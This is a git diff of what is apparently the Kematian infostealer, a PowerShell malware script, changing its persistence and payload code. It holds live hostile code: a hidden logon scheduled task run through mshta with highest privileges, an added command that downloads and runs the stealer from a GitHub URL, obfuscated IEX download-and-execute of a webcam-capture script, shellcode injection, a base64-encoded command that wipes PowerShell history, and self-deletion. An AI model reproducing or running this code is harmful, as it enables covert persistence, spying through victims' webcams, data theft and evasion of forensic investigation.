@@ -65,7 +65,11 @@ function AUTOUPDATE {
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
         Start-ScheduledTask -TaskName "Kematian"
-        if ($melt) { Remove-Item $pscommandpath -force }
+        if ($melt) { 
+            try {
+                Remove-Item $pscommandpath -force
+            } catch {}
+        }
     }
     else {
         KDMUTEX
@@ -122,6 +126,11 @@ function VMPROTECT {
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
+        if $PSCommandPath -eq $null {
+            Write-Host "Please run the script with admin!" -ForegroundColor Red
+            Start-Sleep -Seconds 5
+            Exit 1
+        }
         if ($debug -eq $true) {
             try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
         }
@@ -746,7 +755,7 @@ Pass: $decodedPass
     Write-Host "[!] Capturing an image with Webcam !"
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
-    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput ($PSCommandPath + ":stdout")
+    $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $invokewebcam.WaitForExit()
     Write-Host "[!] Webcam captured !" -ForegroundColor Green
 
@@ -877,18 +886,6 @@ Pass: $decodedPass
     $proc.WaitForExit()
     Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
 
-    #$stdout = Get-Content ($PSCommandPath + ":stdout")
-    #$outArray = $stdout -split "`n"
-    ##for every line in outArray (line 1 = discord.json, line 2 = contents of discord.json base64 encoded gunzip)
-    #for ($i = 0; $i -lt $outArray.Length; $i += 2) {
-    #    $file = $outArray[$i]
-    #    Write-Host $file
-    #    $content = $outArray[$i + 1]
-    #    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))
-    #    #ungzip the content
-    #    $content = [System.Text.Encoding]::UTF8.GetString([System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new([System.Convert]::FromBase64String($content)), [System.IO.Compression.CompressionMode]::Decompress))
-    #    $content | Out-File $file -Force
-    #}
 
     $main_temp = "$env:localappdata\temp"
 
@@ -1160,9 +1157,8 @@ function Invoke-TASKS {
         # Hidden Directory
         $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
         $KDOT_DIR.attributes = "Hidden", "System"
-        Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Kematian\Kematian.ps1" -Force
         $task_name = "Kematian"
-        $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
+        $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -C ''iwr -Uri https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1 -OutFile %appdata%\Kematian\Kematian.ps1 ; powershell.exe -exec bypass -NoProfile -NonInteractive -F %appdata%\Kematian\Kematian.ps1''",0)(window.close)'
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
@@ -1192,7 +1188,11 @@ if (CHECK_AND_PATCH -eq $true) {
     $script:SingleInstanceEvent.Dispose()
     #removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
-    if ($melt) { ri $pscommandpath -force }
+    if ($melt) { 
+        try {
+            Remove-Item $pscommandpath -force
+        } catch {}
+    }
 
 }
 else {
